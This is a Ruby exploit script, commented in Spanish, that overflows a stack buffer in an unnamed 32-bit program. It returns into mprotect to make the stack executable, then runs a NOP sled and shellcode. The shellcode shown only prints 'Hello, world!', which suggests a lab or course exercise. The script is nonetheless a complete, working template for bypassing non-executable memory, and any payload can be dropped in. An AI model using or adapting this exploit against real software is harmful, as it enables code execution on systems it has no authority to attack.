#!/usr/bin/ruby

#====================================================================
# PARÁMETROS DE CONFIGURACIÓN
#--------------------------------------------------------------------

# Distancia desde el inicio del buffer hasta la dirección de retorno.
FILLER_LENGTH = 0x48

# Dirección de la base del frame de la función; se utiliza para
# calcular la dirección hacia dónde saltar.
FRAME_BASE_ADDRESS = 0xffffce98

# Dirección de mprotect.
MPROTECT_ADDRESS = 0xf7ecd660

# Longitud del nopsled luego de la dirección de retorno.
NOPSLED_LENGTH = 1024

PAGE_SIZE = 0x1000

PAYLOAD =
"\xE8\x30\x00\x00\x00\x48\x65\x6C" +
"\x6C\x6F\x2C\x20\x77\x6F\x72\x6C" +
"\x64\x21\xB8\x09\x00\x00\x00\x40" +
"\x88\x41\x0D\xBB\x01\x00\x00\x00" +
"\xBA\x0E\x00\x00\x00\xB8\x04\x00" +
"\x00\x00\xCD\x80\x31\xDB\xB8\x01" +
"\x00\x00\x00\xCD\x80\x59\xEB\xDA"

#===================================================================
# EXPLOIT
#-------------------------------------------------------------------

# Generamos los bytes para llenar y desbordar el buffer.
filler = 'A'*FILLER_LENGTH

target_addr = FRAME_BASE_ADDRESS + 4 + NOPSLED_LENGTH/2

chain = [
  MPROTECT_ADDRESS,               # &mprotect
  target_addr,                    # &payload / nopsled
  target_addr & ~(PAGE_SIZE - 1), # mprotect arg addr
  PAGE_SIZE + 1,                  # mprotect arg len
  0x7                             # mprotect arg prot
].pack('V*')

# Generamos el nopsled.
nopsled = "\x90"*NOPSLED_LENGTH

# Emitimos el exploit completo.
exploit = [
  filler, 
  chain,
  nopsled,
  PAYLOAD].map do |x|
  x.force_encoding("ASCII-8BIT")
end

print exploit.join
